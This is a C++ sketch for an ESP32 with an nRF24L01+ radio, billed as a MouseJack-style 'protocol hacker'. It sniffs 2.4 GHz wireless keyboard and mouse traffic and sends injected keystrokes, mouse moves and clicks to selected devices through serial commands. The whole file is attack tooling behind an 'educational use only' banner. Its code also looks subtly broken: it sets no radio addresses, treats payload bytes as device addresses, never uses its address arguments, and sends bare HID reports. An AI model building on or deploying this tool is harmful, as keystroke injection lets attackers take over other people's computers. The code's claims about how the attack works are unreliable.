/*
 * H4 — nRF24 Protocol Hacker (MouseJack)
 * Sniff and inject wireless keyboard/mouse traffic using nRF24L01+
 * 
 * Hardware: ESP32 NodeMCU + nRF24L01+
 * 
 * nRF24 Wiring (Hardware VSPI):
 *   CLK  → D18 (GPIO18)
 *   MOSI → D23 (GPIO23)
 *   MISO → D19 (GPIO19)
 *   CSN  → D26 (GPIO26)
 *   CE   → D27 (GPIO27)
 *   VCC  → 3.3V
 *   GND  → GND
 * 
 * WARNING: Educational use only. Test on your own devices.
 * 
 * References:
 *   - MouseJack (Bastille Networks)
 *   - nRF24L01+ Datasheet
 *   - USB HID Protocol
 * 
 * Author: 5h4d0wn1k
 * License: MIT
 * Date: 2026-08-26
 */

#include <SPI.h>
#include <nRF24L01.h>
#include <RF24.h>

// nRF24 Configuration
#define CE_PIN    27
#define CSN_PIN   26

// Common nRF24 channels used by wireless peripherals
// Channel 8: Common for Logitech
// Channel 10: Common for Dell
// Channel 19: Common for Microsoft
// Channel 25: Common for Apple (partial)
// Channel 37: Common for various
#define NUM_CHANNELS 41
#define MAX_PAYLOAD 32

// MouseJack packet structure (simplified)
struct MouseJackPacket {
    uint8_t address[5];     // Device address
    uint8_t channel;        // Capture channel
    uint8_t payload[MAX_PAYLOAD];
    uint8_t length;
    uint32_t timestamp;
    bool valid;
};

// Injection packet types
enum PacketType {
    PACKET_KEY_PRESS,
    PACKET_KEY_RELEASE,
    PACKET_MOUSE_MOVE,
    PACKET_MOUSE_CLICK,
    PACKET_MOUSE_SCROLL
};

// Global objects
RF24 radio(CE_PIN, CSN_PIN);

// Captured packets
MouseJackPacket captured_packets[50];
int capture_count = 0;

// Device tracking
struct DeviceInfo {
    uint8_t address[5];
    uint8_t channel;
    char name[32];
    bool active;
    uint32_t last_seen;
    uint32_t packet_count;
};

DeviceInfo devices[20];
int device_count = 0;

// Common HID report sizes
#define MOUSE_REPORT_SIZE    3
#define KEYBOARD_REPORT_SIZE 8

// Function prototypes
void scanChannels();
void sniffChannel(uint8_t channel);
void packetSniffer();
void injectKeyPress(uint8_t* address, uint8_t key);
void injectMouseMove(uint8_t* address, int8_t x, int8_t y);
void injectMouseClick(uint8_t* address, uint8_t button);
void listDevices();
void selectDevice(int index);
void showHelp();
void processSerialCommand();

// Sniffing state
bool sniffing = false;
uint8_t current_channel = 0;
int selected_device = -1;

void setup() {
    Serial.begin(115200);
    Serial.println("\n=== H4 — nRF24 Protocol Hacker ===");
    Serial.println("MouseJack-style wireless peripheral analysis");
    Serial.println("WARNING: Educational use only!");
    Serial.println();
    
    // Initialize nRF24L01+
    if (!radio.begin()) {
        Serial.println("nRF24 initialization failed!");
        while (1) delay(1000);
    }
    
    Serial.println("nRF24 initialized successfully");
    Serial.println();
    showHelp();
}

void loop() {
    // Handle sniffing
    if (sniffing) {
        packetSniffer();
    }
    
    // Handle serial commands
    if (Serial.available()) {
        processSerialCommand();
    }
}

void processSerialCommand() {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    
    if (cmd == "help") {
        showHelp();
    } else if (cmd == "scan") {
        scanChannels();
    } else if (cmd.startsWith("sniff ")) {
        int ch = cmd.substring(6).toInt();
        sniffChannel(ch);
    } else if (cmd == "sniff") {
        // Start continuous sniffing on all channels
        sniffing = true;
        Serial.println("Starting channel hopping sniff...");
    } else if (cmd == "stop") {
        sniffing = false;
        Serial.println("Sniffing stopped.");
    } else if (cmd == "devices") {
        listDevices();
    } else if (cmd.startsWith("select ")) {
        int idx = cmd.substring(7).toInt();
        selectDevice(idx);
    } else if (cmd.startsWith("inject key ")) {
        // inject key 0x04 (A key)
        uint8_t key = strtoul(cmd.substring(11).c_str(), NULL, 16);
        if (selected_device >= 0) {
            injectKeyPress(devices[selected_device].address, key);
        } else {
            Serial.println("No device selected!");
        }
    } else if (cmd.startsWith("inject move ")) {
        // inject move 10 0 (x, y)
        int space = cmd.indexOf(' ', 12);
        int x = cmd.substring(12, space).toInt();
        int y = cmd.substring(space + 1).toInt();
        if (selected_device >= 0) {
            injectMouseMove(devices[selected_device].address, x, y);
        } else {
            Serial.println("No device selected!");
        }
    } else if (cmd.startsWith("inject click ")) {
        // inject click 1 (button: 1=left, 2=right, 3=middle)
        uint8_t button = cmd.substring(13).toInt();
        if (selected_device >= 0) {
            injectMouseClick(devices[selected_device].address, button);
        } else {
            Serial.println("No device selected!");
        }
    } else if (cmd == "clear") {
        capture_count = 0;
        device_count = 0;
        Serial.println("Cleared all captures and devices.");
    } else {
        Serial.println("Unknown command. Type 'help' for commands.");
    }
}

void showHelp() {
    Serial.println("\n=== Commands ===");
    Serial.println("scan          - Scan all channels for devices");
    Serial.println("sniff         - Start channel hopping sniff");
    Serial.println("sniff CH      - Sniff specific channel");
    Serial.println("stop          - Stop sniffing");
    Serial.println("devices       - List discovered devices");
    Serial.println("select N      - Select device N");
    Serial.println("inject key XX - Inject key press (hex)");
    Serial.println("inject move X Y - Inject mouse move");
    Serial.println("inject click B - Inject mouse click (1=L, 2=R, 3=M)");
    Serial.println("clear         - Clear all captures");
    Serial.println("help          - Show this help");
    Serial.println("================\n");
}

void scanChannels() {
    Serial.println("\n=== Scanning 41 nRF24 Channels ===");
    Serial.println("Listening for 2.4 GHz traffic...");
    Serial.println();
    
    for (int ch = 0; ch < NUM_CHANNELS; ch++) {
        radio.setChannel(ch);
        radio.startListening();
        delay(25);  // Short listen time
        
        if (radio.available()) {
            uint8_t payload[MAX_PAYLOAD];
            int len = radio.getDynamicPayloadSize();
            if (len > MAX_PAYLOAD) len = MAX_PAYLOAD;
            radio.read(payload, len);
            
            Serial.printf("[CH:%2d] ", ch);
            Serial.print("Traffic: ");
            for (int i = 0; i < min(len, 16); i++) {
                Serial.printf("%02X ", payload[i]);
            }
            Serial.println();
            
            // Try to identify device
            identifyDevice(ch, payload, len);
        }
        
        radio.stopListening();
    }
    
    Serial.println("\nScan complete.");
    Serial.printf("Found %d devices\n", device_count);
    Serial.println("========================\n");
}

void sniffChannel(uint8_t channel) {
    Serial.printf("\n=== Sniffing Channel %d ===\n", channel);
    Serial.println("Press any key to stop...");
    
    radio.setChannel(channel);
    radio.startListening();
    
    uint32_t packet_count = 0;
    
    while (!Serial.available()) {
        if (radio.available()) {
            uint8_t payload[MAX_PAYLOAD];
            int len = radio.getDynamicPayloadSize();
            if (len > MAX_PAYLOAD) len = MAX_PAYLOAD;
            radio.read(payload, len);
            
            packet_count++;
            
            Serial.printf("\n[PKT #%lu] ", packet_count);
            Serial.printf("LEN:%d ", len);
            
            // Display as HEX
            Serial.print("HEX: ");
            for (int i = 0; i < len; i++) {
                Serial.printf("%02X ", payload[i]);
            }
            Serial.println();
            
            // Try to parse as HID
            parseHIDPayload(payload, len);
            
            // Store packet
            if (capture_count < 50) {
                memcpy(captured_packets[capture_count].payload, payload, len);
                captured_packets[capture_count].length = len;
                captured_packets[capture_count].channel = channel;
                captured_packets[capture_count].timestamp = millis();
                captured_packets[capture_count].valid = true;
                capture_count++;
            }
        }
        delayMicroseconds(100);
    }
    
    radio.stopListening();
    Serial.read();  // Clear the keypress
    Serial.printf("\nSniffing stopped. Captured %lu packets.\n", packet_count);
}

void packetSniffer() {
    // Channel hopping mode
    static uint32_t last_hop = 0;
    static uint32_t total_packets = 0;
    
    if (millis() - last_hop >= 100) {  // Hop every 100ms
        current_channel = (current_channel + 1) % NUM_CHANNELS;
        radio.setChannel(current_channel);
        radio.startListening();
        last_hop = millis();
    }
    
    if (radio.available()) {
        uint8_t payload[MAX_PAYLOAD];
        int len = radio.getDynamicPayloadSize();
        if (len > MAX_PAYLOAD) len = MAX_PAYLOAD;
        radio.read(payload, len);
        
        total_packets++;
        
        Serial.printf("[CH:%2d] ", current_channel);
        for (int i = 0; i < min(len, 16); i++) {
            Serial.printf("%02X ", payload[i]);
        }
        if (len > 16) Serial.print("...");
        Serial.println();
        
        // Try to identify device
        identifyDevice(current_channel, payload, len);
    }
}

void identifyDevice(uint8_t channel, uint8_t* payload, uint8_t length) {
    // Check if we already know this device
    for (int i = 0; i < device_count; i++) {
        if (devices[i].channel == channel) {
            devices[i].last_seen = millis();
            devices[i].packet_count++;
            return;
        }
    }
    
    // New device found
    if (device_count < 20) {
        // Use first 5 bytes as pseudo-address
        memcpy(devices[device_count].address, payload, 5);
        devices[device_count].channel = channel;
        devices[device_count].active = true;
        devices[device_count].last_seen = millis();
        devices[device_count].packet_count = 1;
        
        // Try to identify by packet structure
        if (length == MOUSE_REPORT_SIZE) {
            strcpy(devices[device_count].name, "Mouse");
        } else if (length == KEYBOARD_REPORT_SIZE) {
            strcpy(devices[device_count].name, "Keyboard");
        } else {
            strcpy(devices[device_count].name, "Unknown Device");
        }
        
        Serial.printf("\n[NEW DEVICE] CH:%d Type: %s\n", 
                     channel, devices[device_count].name);
        
        device_count++;
    }
}

void parseHIDPayload(uint8_t* payload, uint8_t length) {
    // Try to parse as HID report
    
    // Mouse report (3 bytes): [buttons] [x] [y]
    if (length == MOUSE_REPORT_SIZE) {
        uint8_t buttons = payload[0];
        int8_t x = (int8_t)payload[1];
        int8_t y = (int8_t)payload[2];
        
        Serial.printf("  MOUSE: Buttons=%02X X=%d Y=%d", buttons, x, y);
        if (buttons & 0x01) Serial.print(" [LEFT]");
        if (buttons & 0x02) Serial.print(" [RIGHT]");
        if (buttons & 0x04) Serial.print(" [MIDDLE]");
        Serial.println();
    }
    // Keyboard report (8 bytes): [modifier] [reserved] [key1] [key2] [key3] [key4] [key5] [key6]
    else if (length == KEYBOARD_REPORT_SIZE) {
        uint8_t modifier = payload[0];
        
        Serial.printf("  KEYBOARD: Mod=%02X", modifier);
        if (modifier & 0x01) Serial.print(" [CTRL]");
        if (modifier & 0x02) Serial.print(" [SHIFT]");
        if (modifier & 0x04) Serial.print(" [ALT]");
        if (modifier & 0x08) Serial.print(" [GUI]");
        
        // Check for key presses
        bool has_keys = false;
        for (int i = 2; i < 8; i++) {
            if (payload[i] != 0) {
                if (!has_keys) Serial.print(" Keys: ");
                Serial.printf("%02X ", payload[i]);
                has_keys = true;
            }
        }
        Serial.println();
    }
    else {
        Serial.printf("  UNKNOWN: %d bytes\n", length);
    }
}

void listDevices() {
    if (device_count == 0) {
        Serial.println("No devices discovered yet. Run 'scan' first.");
        return;
    }
    
    Serial.println("\n=== Discovered Devices ===");
    for (int i = 0; i < device_count; i++) {
        Serial.printf("[%2d] CH:%2d | %-20s | Packets: %lu | %s\n",
                     i, devices[i].channel, devices[i].name,
                     devices[i].packet_count,
                     devices[i].active ? "ACTIVE" : "INACTIVE");
    }
    Serial.println("==========================\n");
}

void selectDevice(int index) {
    if (index < 0 || index >= device_count) {
        Serial.println("Invalid device index!");
        return;
    }
    
    selected_device = index;
    Serial.printf("Selected device #%d: %s\n", index, devices[index].name);
}

void injectKeyPress(uint8_t* address, uint8_t key) {
    Serial.printf("\n[INJECT] Key press: 0x%02X\n", key);
    
    // Keyboard HID report format
    uint8_t report[KEYBOARD_REPORT_SIZE] = {0};
    report[2] = key;  // Key code
    
    // Send packet
    radio.stopListening();
    radio.setChannel(devices[selected_device].channel);
    radio.write(report, KEYBOARD_REPORT_SIZE);
    radio.startListening();
    
    delay(50);
    
    // Release key
    uint8_t release[KEYBOARD_REPORT_SIZE] = {0};
    radio.stopListening();
    radio.write(release, KEYBOARD_REPORT_SIZE);
    radio.startListening();
    
    Serial.println("  Sent!");
}

void injectMouseMove(uint8_t* address, int8_t x, int8_t y) {
    Serial.printf("\n[INJECT] Mouse move: X=%d, Y=%d\n", x, y);
    
    // Mouse HID report format
    uint8_t report[MOUSE_REPORT_SIZE] = {0};
    report[1] = x;
    report[2] = y;
    
    // Send packet
    radio.stopListening();
    radio.setChannel(devices[selected_device].channel);
    radio.write(report, MOUSE_REPORT_SIZE);
    radio.startListening();
    
    Serial.println("  Sent!");
}

void injectMouseClick(uint8_t* address, uint8_t button) {
    Serial.printf("\n[INJECT] Mouse click: button %d\n", button);
    
    // Mouse HID report format
    uint8_t report[MOUSE_REPORT_SIZE] = {0};
    report[0] = button;  // Button press
    
    // Send press
    radio.stopListening();
    radio.setChannel(devices[selected_device].channel);
    radio.write(report, MOUSE_REPORT_SIZE);
    radio.startListening();
    
    delay(50);
    
    // Release
    uint8_t release[MOUSE_REPORT_SIZE] = {0};
    radio.stopListening();
    radio.write(release, MOUSE_REPORT_SIZE);
    radio.startListening();
    
    Serial.println("  Sent!");
}
